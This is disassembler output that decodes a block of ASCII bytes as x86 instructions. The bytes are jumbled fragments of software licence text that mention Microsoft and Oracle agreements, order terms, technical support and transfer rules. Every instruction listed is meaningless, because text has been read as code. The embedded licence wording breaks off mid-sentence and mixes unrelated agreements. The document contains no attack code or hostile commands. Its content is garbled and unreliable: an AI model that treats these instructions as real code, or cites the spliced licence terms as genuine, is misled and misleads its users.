  436258:	6d                   	insl   (%dx),%es:(%edi)
  436259:	20 74 68 65          	and    %dh,0x65(%eax,%ebp,2)
  43625d:	20 65 66             	and    %ah,0x66(%ebp)
  436260:	66 65 63 74 69 76    	arpl   %si,%gs:0x76(%ecx,%ebp,2)
  436266:	65 20 64 61 74       	and    %ah,%gs:0x74(%ecx,%eiz,2)
  43626b:	65 20 6f 66          	and    %ch,%gs:0x66(%edi)
  43626f:	20 79 6f             	and    %bh,0x6f(%ecx)
  436272:	75 72                	jne    0x4362e6
  436274:	20 6f 72             	and    %ch,0x72(%edi)
  436277:	64 65 72 2e          	fs gs jb 0x4362a9
  43627b:	20 41 74             	and    %al,0x74(%ecx)
  43627e:	20 74 68 65          	and    %dh,0x65(%eax,%ebp,2)
  436282:	20 65 6e             	and    %ah,0x6e(%ebp)
  436285:	64 20 6f 66          	and    %ch,%fs:0x66(%edi)
  436289:	20 74 68 65          	and    %dh,0x65(%eax,%ebp,2)
  43628d:	20 74 65 72          	and    %dh,0x72(%ebp,%eiz,2)
  436291:	6d                   	insl   (%dx),%es:(%edi)
  436292:	2c 20                	sub    $0x20,%al
  436294:	79 6f                	jns    0x436305
  436296:	75 20                	jne    0x4362b8
  436298:	6d                   	insl   (%dx),%es:(%edi)
  436299:	61                   	popa
  43629a:	79 20                	jns    0x4362bc
  43629c:	72 65                	jb     0x436303
  43629e:	6e                   	outsb  %ds:(%esi),(%dx)
  43629f:	65 77 20             	gs ja  0x4362c2
  4362a2:	79 6f                	jns    0x436313
  4362a4:	75 72                	jne    0x436318
  4362a6:	20 6f 72             	and    %ch,0x72(%edi)
  4362a9:	64 65 72 20          	fs gs jb 0x4362cd
  4362ad:	66 6f                	outsw  %ds:(%esi),(%dx)
  4362af:	72 20                	jb     0x4362d1
  4362b1:	61                   	popa
  4362b2:	6e                   	outsb  %ds:(%esi),(%dx)
  4362b3:	20 61 64             	and    %ah,0x64(%ecx)
  4362b6:	64 69 74 69 6f 6e 61 	imul   $0x206c616e,%fs:0x6f(%ecx,%ebp,2),%esi
  4362bd:	6c 20 
  4362bf:	36 20 6d 6f          	and    %ch,%ss:0x6f(%ebp)
  4362c3:	6e                   	outsb  %ds:(%esi),(%dx)
  4362c4:	74 68                	je     0x43632e
  4362c6:	20 74 65 72          	and    %dh,0x72(%ebp,%eiz,2)
  4362ca:	6d                   	insl   (%dx),%es:(%edi)
  4362cb:	20 61 74             	and    %ah,0x74(%ecx)
  4362ce:	20 74 68 65          	and    %dh,0x65(%eax,%ebp,2)
  4362d2:	0a 65 6d             	or     0x6d(%ebp),%ah
  4362d5:	70 6c                	jo     0x436343
  4362d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4362d8:	79 65                	jns    0x43633f
  4362da:	65 20 77 68          	and    %dh,%gs:0x68(%edi)
  4362de:	6f                   	outsl  %ds:(%esi),(%dx)
  4362df:	20 68 61             	and    %ch,0x61(%eax)
  4362e2:	73 20                	jae    0x436304
  4362e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4362e5:	6e                   	outsb  %ds:(%esi),(%dx)
  4362e6:	65 20 6f 72          	and    %ch,%gs:0x72(%edi)
  4362ea:	20 6d 6f             	and    %ch,0x6f(%ebp)
  4362ed:	72 65                	jb     0x436354
  4362ef:	20 62 65             	and    %ah,0x65(%edx)
  4362f2:	6e                   	outsb  %ds:(%esi),(%dx)
  4362f3:	65 66 69 74 20 70 6c 	imul   $0x616c,%gs:0x70(%eax,%eiz,1),%si
  4362fa:	61 
  4362fb:	6e                   	outsb  %ds:(%esi),(%dx)
  4362fc:	73 20                	jae    0x43631e
  4362fe:	6d                   	insl   (%dx),%es:(%edi)
  4362ff:	61                   	popa
  436300:	6e                   	outsb  %ds:(%esi),(%dx)
  436301:	61                   	popa
  436302:	67 65 64 20 62 79    	gs and %ah,%fs:0x79(%bp,%si)
  436308:	20 74 68 65          	and    %dh,0x65(%eax,%ebp,2)
  43630c:	20 73 79             	and    %dh,0x79(%ebx)
  43630f:	73 74                	jae    0x436385
  436311:	65 6d                	gs insl (%dx),%es:(%edi)
  436313:	20 6f 72             	and    %ch,0x72(%edi)
  436316:	20 63 6f             	and    %ah,0x6f(%ebx)
  436319:	6e                   	outsb  %ds:(%esi),(%dx)
  43631a:	74 69                	je     0x436385
  43631c:	6e                   	outsb  %ds:(%esi),(%dx)
  43631d:	75 65                	jne    0x436384
  43631f:	73 20                	jae    0x436341
  436321:	74 6f                	je     0x436392
  436323:	20 62 65             	and    %ah,0x65(%edx)
  436326:	20 70 61             	and    %dh,0x61(%eax)
  436329:	69 64 20 74 68 72 6f 	imul   $0x756f7268,0x74(%eax,%eiz,1),%esp
  436330:	75 
  436331:	67 68 20 74 68 65    	addr16 push $0x65687420
  436337:	20 73 79             	and    %dh,0x79(%ebx)
  43633a:	73 74                	jae    0x4363b0
  43633c:	65 6d                	gs insl (%dx),%es:(%edi)
  43633e:	2e 20 46 6f          	and    %al,%cs:0x6f(%esi)
  436342:	72 20                	jb     0x436364
  436344:	54                   	push   %esp
  436345:	69 6d 65 20 61 6e 64 	imul   $0x646e6120,0x65(%ebp),%ebp
  43634c:	0a 63 6f             	or     0x6f(%ebx),%ah
  43634f:	6d                   	insl   (%dx),%es:(%edi)
  436350:	70 75                	jo     0x4363c7
  436352:	74 65                	je     0x4363b9
  436354:	72 29                	jb     0x43637f
  436356:	20 66 6f             	and    %ah,0x6f(%esi)
  436359:	72 20                	jb     0x43637b
  43635b:	75 73                	jne    0x4363d0
  43635d:	65 20 62 79          	and    %ah,%gs:0x79(%edx)
  436361:	20 6f 6e             	and    %ch,0x6e(%edi)
  436364:	65 20 70 65          	and    %dh,%gs:0x65(%eax)
  436368:	72 73                	jb     0x4363dd
  43636a:	6f                   	outsl  %ds:(%esi),(%dx)
  43636b:	6e                   	outsb  %ds:(%esi),(%dx)
  43636c:	20 61 74             	and    %ah,0x74(%ecx)
  43636f:	20 61 20             	and    %ah,0x20(%ecx)
  436372:	74 69                	je     0x4363dd
  436374:	6d                   	insl   (%dx),%es:(%edi)
  436375:	65 2c 20             	gs sub $0x20,%al
  436378:	62 75 74             	bound  %esi,0x74(%ebp)
  43637b:	20 6f 6e             	and    %ch,0x6e(%edi)
  43637e:	6c                   	insb   (%dx),%es:(%edi)
  43637f:	79 20                	jns    0x4363a1
  436381:	69 66 20 79 6f 75 20 	imul   $0x20756f79,0x20(%esi),%esp
  436388:	63 6f 6d             	arpl   %ebp,0x6d(%edi)
  43638b:	70 6c                	jo     0x4363f9
  43638d:	79 20                	jns    0x4363af
  43638f:	77 69                	ja     0x4363fa
  436391:	74 68                	je     0x4363fb
  436393:	20 61 6c             	and    %ah,0x6c(%ecx)
  436396:	6c                   	insb   (%dx),%es:(%edi)
  436397:	20 74 68 65          	and    %dh,0x65(%eax,%ebp,2)
  43639b:	20 74 65 72          	and    %dh,0x72(%ebp,%eiz,2)
  43639f:	6d                   	insl   (%dx),%es:(%edi)
  4363a0:	73 20                	jae    0x4363c2
  4363a2:	6f                   	outsl  %ds:(%esi),(%dx)
  4363a3:	66 20 74 68 69       	data16 and %dh,0x69(%eax,%ebp,2)
  4363a8:	73 20                	jae    0x4363ca
  4363aa:	61                   	popa
  4363ab:	67 72 65             	addr16 jb 0x436413
  4363ae:	65 6d                	gs insl (%dx),%es:(%edi)
  4363b0:	65 6e                	outsb  %gs:(%esi),(%dx)
  4363b2:	74 2e                	je     0x4363e2
  4363b4:	0a 77 68             	or     0x68(%edi),%dh
  4363b7:	69 63 68 20 66 61 63 	imul   $0x63616620,0x68(%ebx),%esp
  4363be:	69 6c 69 74 61 74 65 	imul   $0x73657461,0x74(%ecx,%ebp,2),%ebp
  4363c5:	73 
  4363c6:	20 63 6f             	and    %ah,0x6f(%ebx)
  4363c9:	6d                   	insl   (%dx),%es:(%edi)
  4363ca:	6d                   	insl   (%dx),%es:(%edi)
  4363cb:	75 6e                	jne    0x43643b
  4363cd:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  4363d4:	20 6f 66             	and    %ch,0x66(%edi)
  4363d7:	20 69 6e             	and    %ch,0x6e(%ecx)
  4363da:	66 6f                	outsw  %ds:(%esi),(%dx)
  4363dc:	72 6d                	jb     0x43644b
  4363de:	61                   	popa
  4363df:	74 69                	je     0x43644a
  4363e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4363e2:	6e                   	outsb  %ds:(%esi),(%dx)
  4363e3:	20 62 65             	and    %ah,0x65(%edx)
  4363e6:	74 77                	je     0x43645f
  4363e8:	65 65 6e             	gs outsb %gs:(%esi),(%dx)
  4363eb:	20 65 61             	and    %ah,0x61(%ebp)
  4363ee:	63 68 20             	arpl   %ebp,0x20(%eax)
  4363f1:	76 65                	jbe    0x436458
  4363f3:	72 73                	jb     0x436468
  4363f5:	69 6f 6e 20 6f 66 20 	imul   $0x20666f20,0x6e(%edi),%ebp
  4363fc:	61                   	popa
  4363fd:	20 74 68 69          	and    %dh,0x69(%eax,%ebp,2)
  436401:	72 64                	jb     0x436467
  436403:	20 70 61             	and    %dh,0x61(%eax)
  436406:	72 74                	jb     0x43647c
  436408:	79 20                	jns    0x43642a
  43640a:	73 6f                	jae    0x43647b
  43640c:	66 74 77             	data16 je 0x436486
  43640f:	61                   	popa
  436410:	72 65                	jb     0x436477
  436412:	20 61 70             	and    %ah,0x70(%ecx)
  436415:	70 6c                	jo     0x436483
  436417:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  43641e:	20 6f 72             	and    %ch,0x72(%edi)
  436421:	20 73 79             	and    %dh,0x79(%ebx)
  436424:	73 74                	jae    0x43649a
  436426:	65 6d                	gs insl (%dx),%es:(%edi)
  436428:	20 61 6e             	and    %ah,0x6e(%ecx)
  43642b:	64 0a 41 70          	or     %fs:0x70(%ecx),%al
  43642f:	70 6c                	jo     0x43649d
  436431:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  436438:	20 55 73             	and    %dl,0x73(%ebp)
  43643b:	65 72 2c             	gs jb  0x43646a
  43643e:	20 45 6e             	and    %al,0x6e(%ebp)
  436441:	74 65                	je     0x4364a8
  436443:	72 70                	jb     0x4364b5
  436445:	72 69                	jb     0x4364b0
  436447:	73 65                	jae    0x4364ae
  436449:	20 41 73             	and    %al,0x73(%ecx)
  43644c:	73 65                	jae    0x4364b3
  43644e:	74 20                	je     0x436470
  436450:	4d                   	dec    %ebp
  436451:	61                   	popa
  436452:	6e                   	outsb  %ds:(%esi),(%dx)
  436453:	61                   	popa
  436454:	67 65 6d             	gs insl (%dx),%es:(%di)
  436457:	65 6e                	outsb  %gs:(%esi),(%dx)
  436459:	74 20                	je     0x43647b
  43645b:	28 45 41             	sub    %al,0x41(%ebp)
  43645e:	4d                   	dec    %ebp
  43645f:	29 20                	sub    %esp,(%eax)
  436461:	55                   	push   %ebp
  436462:	73 65                	jae    0x4364c9
  436464:	72 2c                	jb     0x436492
  436466:	20 46 69             	and    %al,0x69(%esi)
  436469:	65 6c                	gs insb (%dx),%es:(%edi)
  43646b:	64 20 53 61          	and    %dl,%fs:0x61(%ebx)
  43646f:	6c                   	insb   (%dx),%es:(%edi)
  436470:	65 73 20             	gs jae 0x436493
  436473:	55                   	push   %ebp
  436474:	73 65                	jae    0x4364db
  436476:	72 2c                	jb     0x4364a4
  436478:	20 46 69             	and    %al,0x69(%esi)
  43647b:	6e                   	outsb  %ds:(%esi),(%dx)
  43647c:	61                   	popa
  43647d:	6e                   	outsb  %ds:(%esi),(%dx)
  43647e:	63 69 61             	arpl   %ebp,0x61(%ecx)
  436481:	6c                   	insb   (%dx),%es:(%edi)
  436482:	73 20                	jae    0x4364a4
  436484:	55                   	push   %ebp
  436485:	73 65                	jae    0x4364ec
  436487:	72 2c                	jb     0x4364b5
  436489:	20 49 6e             	and    %cl,0x6e(%ecx)
  43648c:	76 65                	jbe    0x4364f3
  43648e:	6e                   	outsb  %ds:(%esi),(%dx)
  43648f:	74 6f                	je     0x436500
  436491:	72 79                	jb     0x43650c
  436493:	2f                   	das
  436494:	53                   	push   %ebx
  436495:	68 69 70 70 69       	push   $0x69707069
  43649a:	6e                   	outsb  %ds:(%esi),(%dx)
  43649b:	67 0a 74 68          	or     0x68(%si),%dh
  43649f:	61                   	popa
  4364a0:	74 20                	je     0x4364c2
  4364a2:	79 6f                	jns    0x436513
  4364a4:	75 20                	jne    0x4364c6
  4364a6:	6d                   	insl   (%dx),%es:(%edi)
  4364a7:	61                   	popa
  4364a8:	79 20                	jns    0x4364ca
  4364aa:	72 65                	jb     0x436511
  4364ac:	63 65 69             	arpl   %esp,0x69(%ebp)
  4364af:	76 65                	jbe    0x436516
  4364b1:	20 66 72             	and    %ah,0x72(%esi)
  4364b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4364b5:	6d                   	insl   (%dx),%es:(%edi)
  4364b6:	20 4d 69             	and    %cl,0x69(%ebp)
  4364b9:	63 72 6f             	arpl   %esi,0x6f(%edx)
  4364bc:	73 6f                	jae    0x43652d
  4364be:	66 74 20             	data16 je 0x4364e1
  4364c1:	64 75 72             	fs jne 0x436536
  4364c4:	69 6e 67 20 74 68 61 	imul   $0x61687420,0x67(%esi),%ebp
  4364cb:	74 20                	je     0x4364ed
  4364cd:	79 65                	jns    0x436534
  4364cf:	61                   	popa
  4364d0:	72 20                	jb     0x4364f2
  4364d2:	61                   	popa
  4364d3:	72 65                	jb     0x43653a
  4364d5:	20 61 6c             	and    %ah,0x6c(%ecx)
  4364d8:	73 6f                	jae    0x436549
  4364da:	20 63 6f             	and    %ah,0x6f(%ebx)
  4364dd:	76 65                	jbe    0x436544
  4364df:	72 65                	jb     0x436546
  4364e1:	64 2c 20             	fs sub $0x20,%al
  4364e4:	62 75 74             	bound  %esi,0x74(%ebp)
  4364e7:	20 6f 6e             	and    %ch,0x6e(%edi)
  4364ea:	6c                   	insb   (%dx),%es:(%edi)
  4364eb:	79 20                	jns    0x43650d
  4364ed:	66 6f                	outsw  %ds:(%esi),(%dx)
  4364ef:	72 20                	jb     0x436511
  4364f1:	74 68                	je     0x43655b
  4364f3:	65 20 72 65          	and    %dh,%gs:0x65(%edx)
  4364f7:	6d                   	insl   (%dx),%es:(%edi)
  4364f8:	61                   	popa
  4364f9:	69 6e 64 65 72 20 6f 	imul   $0x6f207265,0x64(%esi),%ebp
  436500:	66 20 74 68 61       	data16 and %dh,0x61(%eax,%ebp,2)
  436505:	74 0a                	je     0x436511
  436507:	57                   	push   %edi
  436508:	6f                   	outsl  %ds:(%esi),(%dx)
  436509:	72 6b                	jb     0x436576
  43650b:	73 68                	jae    0x436575
  43650d:	6f                   	outsl  %ds:(%esi),(%dx)
  43650e:	70 73                	jo     0x436583
  436510:	0a 6c 69 63          	or     0x63(%ecx,%ebp,2),%ch
  436514:	65 6e                	outsb  %gs:(%esi),(%dx)
  436516:	73 65                	jae    0x43657d
  436518:	73 20                	jae    0x43653a
  43651a:	66 72 6f             	data16 jb 0x43658c
  43651d:	6d                   	insl   (%dx),%es:(%edi)
  43651e:	20 4f 72             	and    %cl,0x72(%edi)
  436521:	61                   	popa
  436522:	63 6c 65 2e          	arpl   %ebp,0x2e(%ebp,%eiz,2)
  436526:	0a 70 72             	or     0x72(%eax),%dh
  436529:	6f                   	outsl  %ds:(%esi),(%dx)
  43652a:	67 72 61             	addr16 jb 0x43658e
  43652d:	6d                   	insl   (%dx),%es:(%edi)
  43652e:	73 2e                	jae    0x43655e
  436530:	20 54 68 65          	and    %dl,0x65(%eax,%ebp,2)
  436534:	20 74 65 72          	and    %dh,0x72(%ebp,%eiz,2)
  436538:	6d                   	insl   (%dx),%es:(%edi)
  436539:	20 43 6f             	and    %al,0x6f(%ebx)
  43653c:	6d                   	insl   (%dx),%es:(%edi)
  43653d:	70 65                	jo     0x4365a4
  43653f:	6e                   	outsb  %ds:(%esi),(%dx)
  436540:	73 61                	jae    0x4365a3
  436542:	74 65                	je     0x4365a9
  436544:	64 20 49 6e          	and    %cl,%fs:0x6e(%ecx)
  436548:	64 69 76 69 64 75 61 	imul   $0x6c617564,%fs:0x69(%esi),%esi
  43654f:	6c 
  436550:	20 69 6e             	and    %ch,0x6e(%ecx)
  436553:	63 6c 75 64          	arpl   %ebp,0x64(%ebp,%esi,2)
  436557:	65 73 2c             	gs jae 0x436586
  43655a:	20 62 75             	and    %ah,0x75(%edx)
  43655d:	74 20                	je     0x43657f
  43655f:	69 73 20 6e 6f 74 20 	imul   $0x20746f6e,0x20(%ebx),%esi
  436566:	6c                   	insb   (%dx),%es:(%edi)
  436567:	69 6d 69 74 65 64 20 	imul   $0x20646574,0x69(%ebp),%ebp
  43656e:	74 6f                	je     0x4365df
  436570:	2c 20                	sub    $0x20,%al
  436572:	79 6f                	jns    0x4365e3
  436574:	75 72                	jne    0x4365e8
  436576:	20 65 6d             	and    %ah,0x6d(%ebp)
  436579:	70 6c                	jo     0x4365e7
  43657b:	6f                   	outsl  %ds:(%esi),(%dx)
  43657c:	79 65                	jns    0x4365e3
  43657e:	65 73 2c             	gs jae 0x4365ad
  436581:	20 63 6f             	and    %ah,0x6f(%ebx)
  436584:	6e                   	outsb  %ds:(%esi),(%dx)
  436585:	74 72                	je     0x4365f9
  436587:	61                   	popa
  436588:	63 74 6f 72          	arpl   %esi,0x72(%edi,%ebp,2)
  43658c:	73 2c                	jae    0x4365ba
  43658e:	20 72 65             	and    %dh,0x65(%edx)
  436591:	74 69                	je     0x4365fc
  436593:	72 65                	jb     0x4365fa
  436595:	65 73 2c             	gs jae 0x4365c4
  436598:	20 61 6e             	and    %ah,0x6e(%ecx)
  43659b:	64 20 61 6e          	and    %ah,%fs:0x6e(%ecx)
  43659f:	79 0a                	jns    0x4365ab
  4365a1:	41                   	inc    %ecx
  4365a2:	2e 20 41 67          	and    %al,%cs:0x67(%ecx)
  4365a6:	72 65                	jb     0x43660d
  4365a8:	65 6d                	gs insl (%dx),%es:(%edi)
  4365aa:	65 6e                	outsb  %gs:(%esi),(%dx)
  4365ac:	74 20                	je     0x4365ce
  4365ae:	44                   	inc    %esp
  4365af:	65 66 69 6e 69 74 69 	imul   $0x6974,%gs:0x69(%esi),%bp
  4365b6:	6f                   	outsl  %ds:(%esi),(%dx)
  4365b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4365b8:	73 0a                	jae    0x4365c4
  4365ba:	31 2e                	xor    %ebp,(%esi)
  4365bc:	20 43 6f             	and    %al,0x6f(%ebx)
  4365bf:	6d                   	insl   (%dx),%es:(%edi)
  4365c0:	70 75                	jo     0x436637
  4365c2:	74 65                	je     0x436629
  4365c4:	72 2e                	jb     0x4365f4
  4365c6:	20 49 6e             	and    %cl,0x6e(%ecx)
  4365c9:	20 74 68 69          	and    %dh,0x69(%eax,%ebp,2)
  4365cd:	73 20                	jae    0x4365ef
  4365cf:	61                   	popa
  4365d0:	67 72 65             	addr16 jb 0x436638
  4365d3:	65 6d                	gs insl (%dx),%es:(%edi)
  4365d5:	65 6e                	outsb  %gs:(%esi),(%dx)
  4365d7:	74 2c                	je     0x436605
  4365d9:	20 e2                	and    %ah,%dl
  4365db:	80 9c 63 6f 6d 70 75 	sbbb   $0x74,0x75706d6f(%ebx,%eiz,2)
  4365e2:	74 
  4365e3:	65 72 e2             	gs jb  0x4365c8
  4365e6:	80 9d 20 6d 65 61 6e 	sbbb   $0x6e,0x61656d20(%ebp)
  4365ed:	73 20                	jae    0x43660f
  4365ef:	61                   	popa
  4365f0:	20 68 61             	and    %ch,0x61(%eax)
  4365f3:	72 64                	jb     0x436659
  4365f5:	77 61                	ja     0x436658
  4365f7:	72 65                	jb     0x43665e
  4365f9:	20 73 79             	and    %dh,0x79(%ebx)
  4365fc:	73 74                	jae    0x436672
  4365fe:	65 6d                	gs insl (%dx),%es:(%edi)
  436600:	20 28                	and    %ch,(%eax)
  436602:	77 68                	ja     0x43666c
  436604:	65 74 68             	gs je  0x43666f
  436607:	65 72 20             	gs jb  0x43662a
  43660a:	70 68                	jo     0x436674
  43660c:	79 73                	jns    0x436681
  43660e:	69 63 61 6c 20 6f 72 	imul   $0x726f206c,0x61(%ebx),%esp
  436615:	20 76 69             	and    %dh,0x69(%esi)
  436618:	72 74                	jb     0x43668e
  43661a:	75 61                	jne    0x43667d
  43661c:	6c                   	insb   (%dx),%es:(%edi)
  43661d:	29 0a                	sub    %ecx,(%edx)
  43661f:	74 65                	je     0x436686
  436621:	63 68 6e             	arpl   %ebp,0x6e(%eax)
  436624:	69 63 61 6c 20 73 75 	imul   $0x7573206c,0x61(%ebx),%esp
  43662b:	70 70                	jo     0x43669d
  43662d:	6f                   	outsl  %ds:(%esi),(%dx)
  43662e:	72 74                	jb     0x4366a4
  436630:	20 70 6f             	and    %dh,0x6f(%eax)
  436633:	6c                   	insb   (%dx),%es:(%edi)
  436634:	69 63 69 65 73 2e 20 	imul   $0x202e7365,0x69(%ebx),%esp
  43663b:	49                   	dec    %ecx
  43663c:	66 20 79 6f          	data16 and %bh,0x6f(%ecx)
  436640:	75 20                	jne    0x436662
  436642:	64 65 63 69 64       	fs arpl %ebp,%gs:0x64(%ecx)
  436647:	65 20 6e 6f          	and    %ch,%gs:0x6f(%esi)
  43664b:	74 20                	je     0x43666d
  43664d:	74 6f                	je     0x4366be
  43664f:	20 70 75             	and    %dh,0x75(%eax)
  436652:	72 63                	jb     0x4366b7
  436654:	68 61 73 65 20       	push   $0x20657361
  436659:	74 65                	je     0x4366c0
  43665b:	63 68 6e             	arpl   %ebp,0x6e(%eax)
  43665e:	69 63 61 6c 20 73 75 	imul   $0x7573206c,0x61(%ebx),%esp
  436665:	70 70                	jo     0x4366d7
  436667:	6f                   	outsl  %ds:(%esi),(%dx)
  436668:	72 74                	jb     0x4366de
  43666a:	2c 20                	sub    $0x20,%al
  43666c:	79 6f                	jns    0x4366dd
  43666e:	75 20                	jne    0x436690
  436670:	6d                   	insl   (%dx),%es:(%edi)
  436671:	61                   	popa
  436672:	79 20                	jns    0x436694
  436674:	6e                   	outsb  %ds:(%esi),(%dx)
  436675:	6f                   	outsl  %ds:(%esi),(%dx)
  436676:	74 20                	je     0x436698
  436678:	75 70                	jne    0x4366ea
  43667a:	64 61                	fs popa
  43667c:	74 65                	je     0x4366e3
  43667e:	20 61 6e             	and    %ah,0x6e(%ecx)
  436681:	79 20                	jns    0x4366a3
  436683:	75 6e                	jne    0x4366f3
  436685:	73 75                	jae    0x4366fc
  436687:	70 70                	jo     0x4366f9
  436689:	6f                   	outsl  %ds:(%esi),(%dx)
  43668a:	72 74                	jb     0x436700
  43668c:	65 64 20 70 72       	gs and %dh,%fs:0x72(%eax)
  436691:	6f                   	outsl  %ds:(%esi),(%dx)
  436692:	67 72 61             	addr16 jb 0x4366f6
  436695:	6d                   	insl   (%dx),%es:(%edi)
  436696:	0a 43 61             	or     0x61(%ebx),%al
  436699:	6e                   	outsb  %ds:(%esi),(%dx)
  43669a:	20 49 20             	and    %cl,0x20(%ecx)
  43669d:	74 72                	je     0x436711
  43669f:	61                   	popa
  4366a0:	6e                   	outsb  %ds:(%esi),(%dx)
  4366a1:	73 66                	jae    0x436709
  4366a3:	65 72 20             	gs jb  0x4366c6
  4366a6:	74 68                	je     0x436710
  4366a8:	65 20 73 6f          	and    %dh,%gs:0x6f(%ebx)
  4366ac:	66 74 77             	data16 je 0x436726
  4366af:	61                   	popa
  4366b0:	72 65                	jb     0x436717
  4366b2:	20 74 6f 20          	and    %dh,0x20(%edi,%ebp,2)
  4366b6:	61                   	popa
  4366b7:	6e                   	outsb  %ds:(%esi),(%dx)
  4366b8:	6f                   	outsl  %ds:(%esi),(%dx)
  4366b9:	74 68                	je     0x436723
  4366bb:	65 72 20             	gs jb  0x4366de
  4366be:	63 6f 6d             	arpl   %ebp,0x6d(%edi)
  4366c1:	70 75                	jo     0x436738
  4366c3:	74 65                	je     0x43672a
  4366c5:	72 20                	jb     0x4366e7
  4366c7:	6f                   	outsl  %ds:(%esi),(%dx)
  4366c8:	72 20                	jb     0x4366ea
  4366ca:	75 73                	jne    0x43673f
  4366cc:	65 72 3f             	gs jb  0x43670e
  4366cf:	20 59 6f             	and    %bl,0x6f(%ecx)
  4366d2:	75 20                	jne    0x4366f4
  4366d4:	6d                   	insl   (%dx),%es:(%edi)
  4366d5:	61                   	popa
  4366d6:	79 20                	jns    0x4366f8
  4366d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4366d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4366da:	74 20                	je     0x4366fc
  4366dc:	74 72                	je     0x436750
  4366de:	61                   	popa
  4366df:	6e                   	outsb  %ds:(%esi),(%dx)
  4366e0:	73 66                	jae    0x436748
  4366e2:	65 72 20             	gs jb  0x436705
  4366e5:	74 68                	je     0x43674f
  4366e7:	65 20 73 6f          	and    %dh,%gs:0x6f(%ebx)
  4366eb:	66 74 77             	data16 je 0x436765
  4366ee:	61                   	popa
  4366ef:	72 65                	jb     0x436756
  4366f1:	20 74 6f 0a          	and    %dh,0xa(%edi,%ebp,2)
  4366f5:	4d                   	dec    %ebp
  4366f6:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  4366fd:	74 20                	je     0x43671f
  4366ff:	43                   	inc    %ebx
  436700:	6f                   	outsl  %ds:(%esi),(%dx)
  436701:	72 70                	jb     0x436773
  436703:	6f                   	outsl  %ds:(%esi),(%dx)
  436704:	72 61                	jb     0x436767
  436706:	74 69                	je     0x436771
  436708:	6f                   	outsl  %ds:(%esi),(%dx)
  436709:	6e                   	outsb  %ds:(%esi),(%dx)
  43670a:	2c 20                	sub    $0x20,%al
  43670c:	41                   	inc    %ecx
  43670d:	20 54 54 4e          	and    %dl,0x4e(%esp,%edx,2)
  436711:	3a 20                	cmp    (%eax),%ah
  436713:	4c                   	dec    %esp
  436714:	43                   	inc    %ebx
  436715:	41                   	inc    %ecx
  436716:	20 41 52             	and    %al,0x52(%ecx)
  436719:	42                   	inc    %edx
  43671a:	49                   	dec    %ecx
  43671b:	54                   	push   %esp
  43671c:	52                   	push   %edx
  43671d:	41                   	inc    %ecx
  43671e:	20 54 49 4f          	and    %dl,0x4f(%ecx,%ecx,2)
  436722:	4e                   	dec    %esi
  436723:	2c 20                	sub    $0x20,%al
  436725:	4f                   	dec    %edi
  436726:	6e                   	outsb  %ds:(%esi),(%dx)
  436727:	65 20 4d 69          	and    %cl,%gs:0x69(%ebp)
  43672b:	63 72 6f             	arpl   %esi,0x6f(%edx)
  43672e:	73 6f                	jae    0x43679f
  436730:	66 74 20             	data16 je 0x436753
  436733:	57                   	push   %edi
  436734:	61                   	popa
  436735:	79 2c                	jns    0x436763
  436737:	20 52 65             	and    %dl,0x65(%edx)
  43673a:	64 6d                	fs insl (%dx),%es:(%edi)
  43673c:	6f                   	outsl  %ds:(%esi),(%dx)
  43673d:	6e                   	outsb  %ds:(%esi),(%dx)
  43673e:	64 2c 20             	fs sub $0x20,%al
  436741:	57                   	push   %edi
  436742:	41                   	inc    %ecx
  436743:	20 39                	and    %bh,(%ecx)
  436745:	38 30                	cmp    %dh,(%eax)
  436747:	35 32 2d 0a 61       	xor    $0x610a2d32,%eax
  43674c:	64 64 69 74 69 6f 6e 	fs imul $0x206c616e,%fs:0x6f(%ecx,%ebp,2),%esi
  436753:	61 6c 20 
  436756:	43                   	inc    %ebx
  436757:	52                   	push   %edx
  436758:	46                   	inc    %esi
  436759:	20 50 61             	and    %dl,0x61(%eax)
  43675c:	67 65 20 6c 69       	and    %ch,%gs:0x69(%si)
  436761:	63 65 6e             	arpl   %esp,0x6e(%ebp)
  436764:	73 65                	jae    0x4367cb
  436766:	73 20                	jae    0x436788
  436768:	66 72 6f             	data16 jb 0x4367da
  43676b:	6d                   	insl   (%dx),%es:(%edi)
  43676c:	20 4f 72             	and    %cl,0x72(%edi)
  43676f:	61                   	popa
  436770:	63 6c 65 2e          	arpl   %ebp,0x2e(%ebp,%eiz,2)
  436774:	0a 49 66             	or     0x66(%ecx),%cl
  436777:	20 79 6f             	and    %bh,0x6f(%ecx)
  43677a:	75 20                	jne    0x43679c
  43677c:	68 61 76 65 20       	push   $0x20657661
  436781:	61                   	popa
  436782:	20 64 69 73          	and    %ah,0x73(%ecx,%ebp,2)
  436786:	70 75                	jo     0x4367fd
  436788:	74 65                	je     0x4367ef
  43678a:	20 77 69             	and    %dh,0x69(%edi)
  43678d:	74 68                	je     0x4367f7
  43678f:	20 4f 72             	and    %cl,0x72(%edi)
  436792:	61                   	popa
  436793:	63 6c 65 20          	arpl   %ebp,0x20(%ebp,%eiz,2)
  436797:	6f                   	outsl  %ds:(%esi),(%dx)
  436798:	72 20                	jb     0x4367ba
  43679a:	69 66 20 79 6f 75 20 	imul   $0x20756f79,0x20(%esi),%esp
  4367a1:	77 69                	ja     0x43680c
  4367a3:	73 68                	jae    0x43680d
  4367a5:	20 74 6f 20          	and    %dh,0x20(%edi,%ebp,2)
  4367a9:	70 72                	jo     0x43681d
  4367ab:	6f                   	outsl  %ds:(%esi),(%dx)
  4367ac:	76 69                	jbe    0x436817
  4367ae:	64 65 20 61 20       	fs and %ah,%gs:0x20(%ecx)
  4367b3:	6e                   	outsb  %ds:(%esi),(%dx)
  4367b4:	6f                   	outsl  %ds:(%esi),(%dx)
  4367b5:	74 69                	je     0x436820
  4367b7:	63 65 20             	arpl   %esp,0x20(%ebp)
  4367ba:	75 6e                	jne    0x43682a
  4367bc:	64 65 72 20          	fs gs jb 0x4367e0
  4367c0:	74 68                	je     0x43682a
  4367c2:	65 20 49 6e          	and    %cl,%gs:0x6e(%ecx)
  4367c6:	64 65 6d             	fs gs insl (%dx),%es:(%edi)
